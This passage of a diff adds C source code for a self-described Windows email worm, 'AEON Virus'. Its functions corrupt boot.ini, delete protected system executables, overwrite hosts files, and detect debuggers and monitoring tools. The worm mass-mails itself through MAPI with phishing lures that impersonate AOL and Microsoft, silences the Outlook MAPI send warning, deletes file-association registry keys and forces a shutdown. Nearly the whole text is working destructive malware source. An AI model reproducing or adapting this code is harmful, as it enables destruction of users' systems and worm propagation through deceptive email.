+	WriteFile(hFile, szHost, sizeof(szHost), &amp;dwNumberOfBytesWritten, NULL);
+	CloseHandle(hFile);
+
+	hFile = CreateFile(szHostFileMSN, GENERIC_WRITE|GENERIC_READ, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+	WriteFile(hFile, szHost, sizeof(szHost), &amp;dwNumberOfBytesWritten, NULL);
+	CloseHandle(hFile);
+}
+
+/* Overwrite the boot.ini file on the system drive, which will result in an error message before loading the bootloader next time,
+making it not possible to start windows */
+void DestroyBootIni(void)
+{
+	HANDLE hFile;
+	DWORD dwNumberOfBytesWritten;
+	char szBootIniDir[MAX_PATH];
+	char szBootIniDir2[MAX_PATH];
+
+	/* Just deleting boot.ini would not have worked (tested on WIN XP SP1), but only Xing the values, being normally 0 or 1 will
+	result in an error message before starting anything (bootloader...) */
+	char szBuffer[] = &quot;[boot loader]\r\n&quot;
+						&quot;timeout=30\r\n&quot;
+						&quot;default=multi(X)disk(X)rdisk(X)partition(X)\\WINDOWS\r\n&quot;
+						&quot;[operating systems]\r\n&quot;
+						&quot;multi(X)disk(X)rdisk(X)partition(X)\\WINDOWS=\&quot;Microsoft Windows\&quot; /fastdetect&quot;;
+
+	/* Get the location of WINDOWS directory, normally C:\WINDOWS */
+	GetWindowsDirectory(szBootIniDir, sizeof(szBootIniDir));
+	/* Getting the first three letters, being the system drive, normally C:\ */
+	strncpy_s(szBootIniDir2, MAX_PATH, szBootIniDir, 3);
+	/* Finally: C:\boot.ini */
+	strcat_s(szBootIniDir2, MAX_PATH, &quot;boot.ini&quot;);
+	
+	/* First delete the file */
+	DeleteFile(szBootIniDir2);
+
+	/* Create the new one with our modified text */
+	hFile = CreateFile(szBootIniDir2, GENERIC_WRITE|GENERIC_READ, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+	WriteFile(hFile, szBuffer, sizeof(szBuffer), &amp;dwNumberOfBytesWritten, NULL);
+	CloseHandle(hFile);
+}
+
+/* A list of almost all important (and most SFC protected) files in %sysdir% and %windir% */
+char *FileNameList[] = {&quot;explorer.exe&quot;, &quot;notepad.exe&quot;, &quot;regedit.exe&quot;, &quot;winhelp.exe&quot;, &quot;cmd.exe&quot;,
+						&quot;accwiz.exe&quot;, &quot;actmovie.exe&quot;, &quot;ahui.exe&quot;, &quot;alg.exe&quot;, &quot;arp.exe&quot;,
+						&quot;at.exe&quot;, &quot;atmadm.exe&quot;, &quot;attrib.exe&quot;, &quot;auditusr.exe&quot;, &quot;autochk.exe&quot;, &quot;autoconv.exe&quot;, &quot;autofmt.exe&quot;,
+						&quot;autolfn.exe&quot;, &quot;bootok.exe&quot;, &quot;bootvrfy.exe&quot;, &quot;cacls.exe&quot;, &quot;calc.exe&quot;, &quot;charmap.exe&quot;, &quot;chkdsk.exe&quot;, 
+						&quot;chkntfs.exe&quot;, &quot;cidaemon.exe&quot;, &quot;cisvc.exe&quot;, &quot;ckcnv.exe&quot;, &quot;cleanmgr.exe&quot;, &quot;cliconfg.exe&quot;, &quot;clipbrd.exe&quot;,
+						&quot;clipsrv.exe&quot;, &quot;cmdl32.exe&quot;, &quot;cmmon32.exe&quot;, &quot;cmstp.exe&quot;, &quot;comp.exe&quot;, &quot;compact.exe&quot;, &quot;control.exe&quot;, &quot;convert.exe&quot;,
+						&quot;cscript.exe&quot;, &quot;ctfmon.exe&quot;, &quot;dcomcnfg.exe&quot;, &quot;ddeshare.exe&quot;, &quot;debug.exe&quot;, &quot;defrag.exe&quot;, 
+						&quot;dfrgfat.exe&quot;, &quot;dfrgntfs.exe&quot;, &quot;diantz.exe&quot;, &quot;diskpart.exe&quot;, &quot;diskperf.exe&quot;, &quot;dllhost.exe&quot;, &quot;dmadmin.exe&quot;,
+						&quot;dmremote.exe&quot;, &quot;doskey.exe&quot;, &quot;dosx.exe&quot;, &quot;dplaysvr.exe&quot;, &quot;dpnsvr.exe&quot;, &quot;dpvsetup.exe&quot;, &quot;drmupgds.exe&quot;,
+						&quot;drwatson.exe&quot;, &quot;drwtsn32.exe&quot;, &quot;dumprep.exe&quot;, &quot;dvdupgrd.exe&quot;, &quot;dwwin.exe&quot;, &quot;dxdiag.exe&quot;,
+						&quot;dxdllreg.exe&quot;, &quot;esentutl.exe&quot;, &quot;eudcedit.exe&quot;, &quot;eventvwr.exe&quot;, &quot;exe2bin.exe&quot;, &quot;expand.exe&quot;, &quot;extrac32.exe&quot;,
+						&quot;fc.exe&quot;, &quot;find.exe&quot;, &quot;findstr.exe&quot;, &quot;finger.exe&quot;, &quot;fixmapi.exe&quot;, &quot;fltmc.exe&quot;, &quot;fontview.exe&quot;, &quot;forcedos.exe&quot;,
+						&quot;freecell.exe&quot;, &quot;fsquirt.exe&quot;, &quot;fsutil.exe&quot;, &quot;ftp.exe&quot;, &quot;getmac.exe&quot;, &quot;gdi.exe&quot;, &quot;grpconv.exe&quot;, &quot;help.exe&quot;, &quot;hostname.exe&quot;,
+						&quot;iexpress.exe&quot;, &quot;imapi.exe&quot;, &quot;ipconfig.exe&quot;, &quot;ipsec6.exe&quot;, &quot;ipv6.exe&quot;, &quot;java.exe&quot;, &quot;javaw.exe&quot;, &quot;javaws.exe&quot;,
+						&quot;jdbgmgr.exe&quot;, &quot;jview.exe&quot;, &quot;krnl386.exe&quot;, &quot;label.exe&quot;, &quot;lights.exe&quot;, &quot;lnkstub.exe&quot;, &quot;locator.exe&quot;, &quot;lodctr.exe&quot;, 
+						&quot;logagent.exe&quot;, &quot;logman.exe&quot;, &quot;logoff.exe&quot;, &quot;logonui.exe&quot;, &quot;lpq.exe&quot;, &quot;lpr.exe&quot;, &quot;magnify.exe&quot;,
+						&quot;makecab.exe&quot;, &quot;mem.exe&quot;, &quot;mmc.exe&quot;, &quot;mnmsrvc.exe&quot;, &quot;mobsync.exe&quot;, &quot;mountvol.exe&quot;, &quot;mplay32.exe&quot;, &quot;mpnotify.exe&quot;,
+						&quot;mrinfo.exe&quot;, &quot;msdtc.exe&quot;, &quot;msg.exe&quot;, &quot;mshearts.exe&quot;, &quot;mshta.exe&quot;, &quot;msiexec.exe&quot;, &quot;mspaint.exe&quot;, &quot;mstinit.exe&quot;,
+						&quot;mstsc.exe&quot;, &quot;narrator.exe&quot;, &quot;nbtstat.exe&quot;, &quot;nddeapir.exe&quot;, &quot;net.exe&quot;, &quot;netdde.exe&quot;, &quot;netsetup.exe&quot;, &quot;netsh.exe&quot;,
+						&quot;netstat.exe&quot;, &quot;nslookup.exe&quot;, &quot;odbcad32.exe&quot;, &quot;odbcconf.exe&quot;, &quot;osk.exe&quot;, &quot;osuninst.exe&quot;,
+						&quot;packager.exe&quot;, &quot;pathping.exe&quot;, &quot;perfmon.exe&quot;, &quot;ping6.exe&quot;, &quot;ping.exe&quot;, &quot;powercfg.exe&quot;, &quot;print.exe&quot;, &quot;proxycfg.exe&quot;,
+						&quot;qappsrv.exe&quot;, &quot;qprocess.exe&quot;, &quot;qwinsta.exe&quot;, &quot;rasautou.exe&quot;, &quot;rasdial.exe&quot;, &quot;rasphone.exe&quot;, &quot;rcimlby.exe&quot;,
+						&quot;rcp.exe&quot;, &quot;rdpclip.exe&quot;,  &quot;rdsaddin.exe&quot;, &quot;rdshost.exe&quot;, &quot;recover.exe&quot;, &quot;redir.exe&quot;, &quot;reg.exe&quot;, &quot;regedt32.exe&quot;,
+						&quot;regini.exe&quot;, &quot;regsvr32.exe&quot;, &quot;regwiz.exe&quot;, &quot;replace.exe&quot;, &quot;reset.exe&quot;, &quot;rexec.exe&quot;, &quot;route.exe&quot;, &quot;routemon.exe&quot;, 
+						&quot;rsh.exe&quot;, &quot;rsm.exe&quot;, &quot;rsmsink.exe&quot;, &quot;rsmui.exe&quot;, &quot;rsvp.exe&quot;, &quot;rtcshare.exe&quot;, &quot;runas.exe&quot;, &quot;rundll32.exe&quot;, &quot;runonce.exe&quot;,
+						&quot;rwinsta.exe&quot;, &quot;savedump.exe&quot;, &quot;sc.exe&quot;, &quot;scardsvr.exe&quot;, &quot;sdbinst.exe&quot;, &quot;services.exe&quot;, &quot;sessmgr.exe&quot;, &quot;sethc.exe&quot;,
+						&quot;setserv.exe&quot;, &quot;sfc.exe&quot;, &quot;shadow.exe&quot;, &quot;share.exe&quot;, &quot;shmgrate.exe&quot;, &quot;shrpubw.exe&quot;, &quot;shutdown.exe&quot;, &quot;sigverif.exe&quot;,
+						&quot;skeys.exe&quot;, &quot;slrundll.exe&quot;, &quot;slserv.exe&quot;, &quot;smbinst.exe&quot;, &quot;smlogsvc.exe&quot;, &quot;sndrec32.exe&quot;, &quot;sndvol32.exe&quot;,
+						&quot;sol.exe&quot;, &quot;sort.exe&quot;, &quot;spider.exe&quot;, &quot;spnpinst.exe&quot;, &quot;sprestrt.exe&quot;, &quot;spdupdsvc.exe&quot;, &quot;stimon.exe&quot;,
+						&quot;subst.exe&quot;, &quot;svchost.exe&quot;, &quot;syncapp.exe&quot;, &quot;sysedit.exe&quot;, &quot;syskey.exe&quot;, &quot;sysocmgr.exe&quot;, &quot;systray.exe&quot;, &quot;taskman.exe&quot;,
+						&quot;taskmgr.exe&quot;, &quot;tcmsetup.exe&quot;, &quot;tcpsvcs.exe&quot;, &quot;telnet.exe&quot;, &quot;tftp.exe&quot;, &quot;tracert6.exe&quot;, &quot;tracert.exe&quot;,
+						&quot;tscon.exe&quot;, &quot;tscupgrd.exe&quot;, &quot;tsdiscon.exe&quot;, &quot;tskill.exe&quot;, &quot;tsshutdn.exe&quot;, &quot;unlodctr.exe&quot;, &quot;upnpcont.exe&quot;, &quot;ups.exe&quot;,
+						&quot;user.exe&quot;, &quot;userinit.exe&quot;, &quot;utilman.exe&quot;, &quot;uWDF.exe&quot;, &quot;verifier.exe&quot;, &quot;vssadmin.exe&quot;, &quot;vssvc.exe&quot;, &quot;w32tm.exe&quot;,
+						&quot;WdfMgr.exe&quot;, &quot;wextract.exe&quot;, &quot;wiaacmgr.exe&quot;, &quot;winchat.exe&quot;, &quot;winmine.exe&quot;, &quot;winmsd.exe&quot;, &quot;winspool.exe&quot;,
+						&quot;winver.exe&quot;, &quot;wjview.exe&quot;, &quot;wmpstub.exe&quot;, &quot;wowdeb.exe&quot;, &quot;wowexec.exe&quot;, &quot;wpabaln.exe&quot;, &quot;wpdshextautoplay.exe&quot;,
+						&quot;wpnpinst.exe&quot;, &quot;write.exe&quot;, &quot;wscntfy.exe&quot;, &quot;wscript.exe&quot;, &quot;wuauclt.exe&quot;, &quot;WudfHost.exe&quot;, &quot;wupdmgr.exe&quot;, &quot;xcopy.exe&quot;, 0};
+
+/* A function deleting SFC protected files by deleting them everywhere on the PC:
+	- %windir%\ServicePackFiles\i386
+	- %windir%
+	- %windir%\system32
+	- %windir%\system32\dllcache
+*/
+void DeleteFileName(char *szFileName)
+{
+	char szWinDir1[MAX_PATH];
+	char szWinDir2[MAX_PATH];
+	char szWinDir3[MAX_PATH];
+	char szWinDir4[MAX_PATH];
+
+	/* %windir\ServicePackFiles\i386\&lt;FILENAME&gt; */
+	GetWindowsDirectory(szWinDir1, sizeof(szWinDir1));
+	strcat_s(szWinDir1, MAX_PATH, &quot;\\ServicePackFiles\\i386\\&quot;);
+	strcat_s(szWinDir1, MAX_PATH, szFileName);
+
+	/* %windir%\&lt;FILENAME&gt; */
+	GetWindowsDirectory(szWinDir2, sizeof(szWinDir2));
+	strcat_s(szWinDir2, MAX_PATH, &quot;\\&quot;);
+	strcat_s(szWinDir2, MAX_PATH, szFileName);
+
+	/* %windir%\system32\&lt;FILENAME&gt; */
+	GetWindowsDirectory(szWinDir3, sizeof(szWinDir3));
+	strcat_s(szWinDir3, MAX_PATH, &quot;\\system32\\&quot;);
+	strcat_s(szWinDir3, MAX_PATH, szFileName);
+
+	/* %windir%\system32\dllcache\&lt;FILENAME&gt; */
+	GetWindowsDirectory(szWinDir4, sizeof(szWinDir4));
+	strcat_s(szWinDir4, MAX_PATH, &quot;\\system32\\dllcache\\&quot;);
+	strcat_s(szWinDir4, MAX_PATH, szFileName);
+
+	/* Delete one file after the other */
+	DeleteFile(szWinDir1);
+	DeleteFile(szWinDir2);
+	DeleteFile(szWinDir3);
+	DeleteFile(szWinDir4);
+}
+
+/* Drop a batch file displaying a short message and keeping it open (&quot; pause &quot;), will be executed 10 times */
+void DropAndExecuteBatch(void)
+{
+	HANDLE hFile;
+	DWORD dwNumberOfBytesWritten;
+	char szSysDirFile[MAX_PATH];
+	int i;
+
+	/* Batch script displaying some information and keeping opened because of the &quot; pause &quot; command */
+	char szBatch[] = &quot;@echo off\r\n&quot;
+						&quot;echo ======================\r\n&quot;
+						&quot;echo === [ AEON Virus ] ===\r\n&quot;
+						&quot;echo ======================\r\n&quot;
+						&quot;echo Author: SkyOut\r\n&quot;
+						&quot;echo Team: [Electrical Ordered Freedom] [EOF]\r\n&quot;
+						&quot;echo Date: 2006\r\n&quot;
+						&quot;pause&quot;;
+
+	/* %sysdir%\Aeon.bat */
+	GetSystemDirectory(szSysDirFile, sizeof(szSysDirFile));
+	strcat_s(szSysDirFile, MAX_PATH, &quot;\\Aeon.bat&quot;);
+
+	/* Create the batch file */
+	hFile = CreateFile(szSysDirFile, GENERIC_WRITE|GENERIC_READ, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+	WriteFile(hFile, szBatch, sizeof(szBatch), &amp;dwNumberOfBytesWritten, NULL);
+	CloseHandle(hFile);
+
+	/* Make it hidden */
+	SetFileAttributes(szSysDirFile, FILE_ATTRIBUTE_HIDDEN);
+
+	/* Execute it ten times */
+	for (i = 0; i &lt; 10; i++)
+	{
+		ShellExecute(NULL, &quot;open&quot;, szSysDirFile, NULL, NULL, SW_NORMAL);
+	}
+}
+
+/* check for SoftIce by Registry key and checking if the driver is loaded in memory */
+BOOL IsSoftIcePresent(void)
+{
+	HANDLE hFile;
+	HKEY hKey;
+
+	/* Check the registry key */
+	RegOpenKeyEx(HKEY_LOCAL_MACHINE, &quot;Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\SoftICE&quot;, 0, KEY_QUERY_VALUE, &amp;hKey);
+
+	if (hKey != ERROR_SUCCESS)
+	{
+		/* SoftIce found */
+		return 1;
+	}
+
+	/* check if the driver is loaded in the memory */
+	hFile = CreateFile(&quot;\\\\.\\SICE&quot;, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
+
+	if (hFile != INVALID_HANDLE_VALUE)
+	{
+		/* SoftIce found */
+		return 1;
+	}
+
+	/* SoftIce not found */
+	return 0;
+}
+
+/* Check for OllyDbg by its window handle */
+BOOL IsOllyDbgPresent(void)
+{
+	HANDLE hWnd;
+
+	/* Search for a window with a title &quot; OllyDbg &quot; */
+	hWnd = FindWindow(NULL, &quot;OllyDbg&quot;);
+
+	if (hWnd != NULL)
+	{
+		/* OllyDbg found */
+		return 1;
+	}
+
+	/* OllyDbg not found */
+	return 0;
+}
+
+/* Checking for FileMon by checking if the driver is loaded in memory and by searching for the window handle */
+BOOL IsFileMonPresent(void)
+{
+	HANDLE hFile;
+	HANDLE hWnd;
+
+	/* check if the driver is loaded in the memory */
+	hFile = CreateFile(&quot;\\\\.\\FILEVXD&quot;, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
+
+	if (hFile != INVALID_HANDLE_VALUE)
+	{
+		/* FileMon found */
+		return 1;
+	}
+
+	/* Search for a window with a title &quot; File Monitor ... &quot; */
+	hWnd = FindWindow(NULL, &quot;File Monitor - Sysinternals: www.sysinternals.com&quot;);
+
+	if (hWnd != NULL)
+	{
+		/* FileMon found */
+		return 1;
+	}
+
+	/* FileMon not found */
+	return 0;
+}
+
+/* Checking for RegMon by checking if the driver is loaded in memory and by searching for the window handle */
+BOOL IsRegMonPresent(void)
+{
+	HANDLE hFile;
+	HANDLE hWnd;
+
+	/* Check if the driver is loaded in the memory */
+	hFile = CreateFile(&quot;\\\\.\\REGVXD&quot;, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
+
+	if (hFile != INVALID_HANDLE_VALUE)
+	{
+		/* RegMon found */
+		return 1;
+	}
+
+	/* Search for a window with a title &quot; Registry Monitor ... &quot; */
+	hWnd = FindWindow(NULL, &quot;Registry Monitor - Sysinternals: www.siliconrealms.com&quot;);
+
+	if (hWnd != NULL)
+	{
+		/* RegMon found */
+		return 1;
+	}
+
+	/* RegMon not found */
+	return 0;
+}
+
+/* Gain the needed priviliges and force to shut down system */
+void SystemShutdown(void)
+{
+	HANDLE hToken;
+	TOKEN_PRIVILEGES tkp;
+
+	OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &amp;hToken);
+	
+	LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &amp;tkp.Privileges[0].Luid); 
+ 
+	tkp.PrivilegeCount = 1;  
+	tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED; 
+ 
+	AdjustTokenPrivileges(hToken, FALSE, &amp;tkp, 0, (PTOKEN_PRIVILEGES)NULL, 0);
+
+	/* After getting all needed privileges force Windows to shutdown */
+	ExitWindowsEx(EWX_SHUTDOWN | EWX_FORCE, 0);
+}
+
+/* Function to send the Emails, getting special values: subject, text and the name of the attached file */
+void SendMail(char *szAddress, LPMAPISENDMAIL SendM, LHANDLE lhSession, char *szVirPath, char *szSubject, char *szText, char *szAttName) 
+{
+	/* Build our Email */
+	MapiRecipDesc *RecipD  = (MapiRecipDesc *)malloc(sizeof(MapiRecipDesc));
+	 
+	/* Build the attachment out of the virus path %sysdir%\Aeon.exe, but with a specified name (szAttName) */
+	MapiFileDesc Attachment = { 0, 0, (ULONG)-1, szVirPath, szAttName, NULL};
+	
+	/* Set Message options, Subject (szSubject) and Text (szText) */
+	MapiMessage Message = {0, 
+						szSubject,
+						szText, 
+						NULL, NULL, NULL, 0, NULL,1, RecipD, 1, &amp;Attachment};
+                
+	/* Set Email options */
+	RecipD-&gt;ulReserved = 0;
+    RecipD-&gt;ulRecipClass = MAPI_TO;
+    RecipD-&gt;lpszName     = szAddress;
+    RecipD-&gt;lpszAddress  = szAddress;
+    RecipD-&gt;ulEIDSize    = 0;
+    RecipD-&gt;lpEntryID    = NULL;
+        
+	/* Send the Email finally */
+	SendM(lhSession, 0L, &amp;Message, 0L, 0L); 
+
+	/* Make the memory we used free again */
+	free(RecipD);
+}
+
+/* Function being called by CreateThread() later spreading the virus via Email (Outlook), subject/text/attachement name are depending on date */
+DWORD WINAPI MailMySelf(void)
+{
+    MapiMessage *lpMessage;
+	HINSTANCE hInst;
+    LPMAPILOGON MAPILogon;
+    LPMAPIFINDNEXT MAPIFindNext;
+    LPMAPIREADMAIL MAPIReadMail;
+    LPMAPISENDMAIL MAPISendMail;
+    LPMAPILOGOFF MAPILogoff;
+    LHANDLE lhSession;
+	SYSTEMTIME stTime;
+	char MsgID[513];
+	char szAeonAtt[MAX_PATH];
+	char szSubject[MAX_PATH];
+	char szText[MAX_PATH];
+	char szAttName[MAX_PATH];
+	char szDate[MAX_PATH];
+
+	/* Get the system time */
+	GetSystemTime(&amp;stTime);
+	/* Saving in a format only telling day (1, 2, 3...) */
+	GetDateFormat(LOCALE_USER_DEFAULT, 0, &amp;stTime, &quot;dd&quot;, szDate, sizeof(szDate));
+
+	/* Now the Subject, Text, Attachment Name depend on the day */
+	if ((stTime.wDay == 1) | (stTime.wDay == 8) | (stTime.wDay == 15) | (stTime.wDay == 22) | (stTime.wDay == 29))
+	{
+		strcpy_s(szSubject, MAX_PATH, &quot;AOL (American Online) Information Email&quot;);
+		strcpy_s(szText, MAX_PATH, &quot;Dear User, \r\n\r\n \
+									AOL is redesigning its inner structure this year, our aim is to become a more open \r\n \
+									company and we want to provide new services around next month, offering free email accounts, \r\n \
+									free webspace and more. If you are still a customer of us or if you are interested in one of those \r\n \
+									benefits you can look into the attachement for more information. In a short time the program enables you \r\n \
+									to get the advantages of our new services. \r\n\r\n \
+									For any feedback you can contact AOL directly by Email: support@aol.com \r\n\r\n \
+									Best regards, \r\n American Online&quot;);
+		strcpy_s(szAttName, MAX_PATH, &quot;AOL.exe&quot;);
+	}
+	else if ((stTime.wDay == 2) | (stTime.wDay == 9) | (stTime.wDay == 16) | (stTime.wDay == 23) | (stTime.wDay == 30))
+	{
+		strcpy_s(szSubject, MAX_PATH, &quot;Play a little game and win one of over 100 things&quot;);
+		strcpy_s(szText, MAX_PATH, &quot;Hello, \r\n\r\n \
+								   In the attachment you can find a little game called \&quot;MoMo\&quot;, it is very easy to play, \r\n \
+								   and is really funny, the best thing is, try to get the highest highscore to win some interesting \r\n \
+								   prices, it can be money or new technical products (computer, digital cameras and more), \r\n \
+								   depends on the state you reach in the list of the best 100 users. Find out yourself and be the best! \r\n\r\n \
+								   Good luck, \r\n K-lineComputer Inc.&quot;);
+		strcpy_s(szAttName, MAX_PATH, &quot;MoMo.exe&quot;);
+	}
+	else if ((stTime.wDay == 3) | (stTime.wDay == 10) | (stTime.wDay == 17) | (stTime.wDay == 24) | (stTime.wDay == 31))
+	{
+		strcpy_s(szSubject, MAX_PATH, &quot;Happy New Year&quot;);
+		strcpy_s(szText, MAX_PATH, &quot;Hey, \r\n\r\n \
+								   I am not sure if you can remember who I am, it has been a long time since we last met, \r\n \
+								   but I have never forgot you =) Maybe in future we can meet again and go to some restaurant or \r\n \
+								   similar things, but first of all I WISH YOU A HAPPY NEW YEAR, good luck for everything you want to try \r\n \
+								   this year. In the attached file you can find a little gift from me and my new address I am living at the \r\n \
+								   moment, hopefully you give it a try. \r\n \
+								   Bye Bye friend&quot;);
+		strcpy_s(szAttName, MAX_PATH, &quot;NewYear.exe&quot;);
+	}
+	else if ((stTime.wDay == 4) | (stTime.wDay == 11) | (stTime.wDay == 18) | (stTime.wDay == 25) | (stTime.wDay == 5))
+	{
+		strcpy_s(szSubject, MAX_PATH, &quot;Opening of a new restaurant&quot;);
+		strcpy_s(szText, MAX_PATH, &quot;Hello, \r\n\r\n \
+								   Next monday will be the big opening of our new restaurant, it is an international place, \r\n \
+								   where you can find new and exciting things to explore. The opening contains a little party \r\n \
+								   and free drinks / food for everyone, we would like to see you and maybe some of your friends or \r\n \
+								   family members there. If you are interested where to find us just look into the attachment. \r\n\r\n \
+								   Best regards and hopefully seeing you next monday, \r\n \
+								   The whole restaurant team.&quot;);
+		strcpy_s(szAttName, MAX_PATH, &quot;Invitation.exe&quot;);
+	}
+	else if ((stTime.wDay == 12) | (stTime.wDay == 19) | (stTime.wDay == 26) | (stTime.wDay == 6) | (stTime.wDay == 13))
+	{
+		strcpy_s(szSubject, MAX_PATH, &quot;Information about our new online newspaper&quot;);
+		strcpy_s(szText, MAX_PATH, &quot;Hello, \r\n\r\n \
+								   With some other people I plan to make a new online newspaper about political and everyday life \r\n \
+								   topics. The first issue of this new newspaper is planned to be released next month and it would be \r\n \
+								   a great help for us to get some feedback from people not involved in the production. In the attached \r\n \
+								   file you can find the index page of our newspaper and you can write a comment if you like. \r\n\r\n \
+								   Thanks in advance for doing it.&quot;);
+		strcpy_s(szAttName, MAX_PATH, &quot;Newspaper.exe&quot;);
+	}
+	else
+	{
+		strcpy_s(szSubject, MAX_PATH, &quot;Microsoft: New worm attack! Patch included (KB987655)&quot;);
+		strcpy_s(szText, MAX_PATH, &quot;Dear Windows User, \r\n\r\n \
+								   Since last week Microsoft is recognizing new worm attacks all over the world. Informed by several \r\n \
+								   Anti-Virus company, like Kaspersky, Symantec and others we decided to bring out a patch for this as fast as \r\n \
+								   possible. The risk to be infected is very high as the worm targets a problem in the network part of Windows, \r\n \
+								   which means that no user action is needed to be infected. To stop a wider spreading of the destructive \r\n \
+								   program and avoid yourself from any damage install the included patch fixing the problem. \r\n\r\n \
+								   Best regards, \r\n Microsoft Security Team&quot;);
+		strcpy_s(szAttName, MAX_PATH, &quot;Patch.exe&quot;);
+	}
+
+	/* Load the needed MAPI library */
+	if(!(hInst = LoadLibrary( &quot;mapi32.dll&quot; ))) 
+		return 0;
+
+	/* %sysdir%\Aeon.exe */
+	GetSystemDirectory(szAeonAtt, sizeof(szAeonAtt));
+	strcat_s(szAeonAtt, MAX_PATH, &quot;\\Aeon.exe&quot;);
+
+	/* Get the needed MAPI functions */
+	MAPILogon = (LPMAPILOGON)GetProcAddress(hInst, &quot;MAPILogon&quot;);
+	MAPIFindNext = (LPMAPIFINDNEXT)GetProcAddress(hInst, &quot;MAPIFindNext&quot;);       
+	MAPIReadMail = (LPMAPIREADMAIL)GetProcAddress(hInst, &quot;MAPIReadMail&quot;);        
+	MAPISendMail = (LPMAPISENDMAIL)GetProcAddress(hInst, &quot;MAPISendMail&quot;);		
+	MAPILogoff = (LPMAPILOGOFF)GetProcAddress(hInst,&quot;MAPILogoff&quot;);
+ 
+	/* Check if all functions can be used, break if one or more can not be used */
+	if( MAPILogon == NULL || MAPIFindNext == NULL || MAPIReadMail == NULL || MAPISendMail == NULL || MAPILogoff == NULL) 
+		return 0;
+
+	/* Try to log in */
+	if(MAPILogon(0, NULL, NULL, 0, 0, &amp;lhSession) == SUCCESS_SUCCESS)
+	{ 
+		while(1)
+        {
+			/* Find new Mail and check for success*/
+			if(MAPIFindNext(lhSession, 0L, NULL, MsgID, MAPI_LONG_MSGID, 0L, MsgID) != SUCCESS_SUCCESS) 
+				break;
+			/* Read the Mail and check for success*/
+			if( MAPIReadMail(lhSession, 0L, MsgID, MAPI_PEEK, 0L, &amp;lpMessage) == SUCCESS_SUCCESS) 
+				/* Send the Mail */
+				SendMail(lpMessage-&gt;lpOriginator-&gt;lpszAddress, MAPISendMail, lhSession, szAeonAtt, szSubject, szText, szAttName);
+		}
+		/* Log out */
+		MAPILogoff(lhSession, 0L, 0L, 0L);
+	 }
+	/* Free the library */
+	FreeLibrary(hInst);
+	return 1;
+}
+
+/* Disable the MAPI Warning when sending the Emails, thanks to Tamiami, DiA, RRLF #7 */
+DWORD DisableMAPIWarning(void)
+{
+	HKEY hKey1;
+	HKEY hKey2;
+	DWORD dwDefaultUserSize;
+	DWORD dwWarnDisable = 0;
+	char szDefaultUserID[MAX_PATH];
+
+	/* Set HKEY_CURRENT_USER\Identities\{XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX}\Software\Microsoft\Outlook Express\5.0\Mail (where
+	X stands for a number or letter, depending on the system) &quot; Warn on Mapi Send &quot; = &quot; 0x00000000 (0) &quot; */
+	if(RegOpenKeyEx(HKEY_CURRENT_USER, &quot;Identities&quot;, 0, KEY_QUERY_VALUE, &amp;hKey1) == ERROR_SUCCESS)
+	{
+		if(RegQueryValueEx(hKey1, &quot;Default User ID&quot;, 0, 0, (BYTE *)&amp;szDefaultUserID, &amp;dwDefaultUserSize) == ERROR_SUCCESS)
+		{
+			if(lstrcat(szDefaultUserID, &quot;\\Software\\Microsoft\\Outlook Express\\5.0\\Mail&quot;) != 0)
+			{
+				if(RegOpenKeyEx(hKey1, szDefaultUserID, 0, KEY_SET_VALUE, &amp;hKey2) == ERROR_SUCCESS)
+				{
+					RegSetValueEx(hKey2, &quot;Warn on Mapi Send&quot;, 0, REG_DWORD, (BYTE *)&amp;dwWarnDisable, sizeof(dwWarnDisable));
+					
+					RegCloseKey(hKey2);
+					RegCloseKey(hKey1);
+
+					return 1;
+				}
+			}
+		}
+		RegCloseKey(hKey1);
+	}
+	return 0;
+}
+
+/* Modify HKEY_CLASSES_ROOTS file associations for all important file types, after this double clicking a file will result in an error message */
+void ModifyHCR(void)
+{
+	RegDeleteKey(HKEY_CLASSES_ROOT, &quot;ACLfile\\shell\\open\\command&quot;);
+	RegDeleteKey(HKEY_CLASSES_ROOT, &quot;acwfile\\shell\\open\\command&quot;);
+	RegDeleteKey(HKEY_CLASSES_ROOT, &quot;AIFFFile\\shell\\open\\command&quot;);
+	RegDeleteKey(HKEY_CLASSES_ROOT, &quot;ASFFile\\shell\\open\\command&quot;);
+	RegDeleteKey(HKEY_CLASSES_ROOT, &quot;aspfile\\shell\\open\\command&quot;);
+	RegDeleteKey(HKEY_CLASSES_ROOT, &quot;ASXFile\\shell\\open\\command&quot;);
+	RegDeleteKey(HKEY_CLASSES_ROOT, &quot;AUFile\\shell\\open\\command&quot;);
+	RegDeleteKey(HKEY_CLASSES_ROOT, &quot;AVIFile\\shell\\open\\command&quot;);
+	RegDeleteKey(HKEY_CLASSES_ROOT, &quot;batfile\\shell\\open\\command&quot;);
+	RegDeleteKey(HKEY_CLASSES_ROOT, &quot;CATFile\\shell\\open\\command&quot;);
+	RegDeleteKey(HKEY_CLASSES_ROOT, &quot;cdafile\\shell\\open\\command&quot;);
+	RegDeleteKey(HKEY_CLASSES_ROOT, &quot;ChatFile\\shell\\open\\command&quot;);
+	RegDeleteKey(HKEY_CLASSES_ROOT, &quot;cmh.file\\shell\\open\\command&quot;);
+	RegDeleteKey(HKEY_CLASSES_ROOT, &quot;clpfile\\shell\\open\\command&quot;);
+	RegDeleteKey(HKEY_CLASSES_ROOT, &quot;cmdfile\\shell\\open\\command&quot;);
+	RegDeleteKey(HKEY_CLASSES_ROOT, &quot;comfile\\shell\\open\\command&quot;);
+	RegDeleteKey(HKEY_CLASSES_ROOT, &quot;CompressedFolder\\shell\\open\\command&quot;);
+	RegDeleteKey(HKEY_CLASSES_ROOT, &quot;ConferenceLink\\shell\\open\\command&quot;);
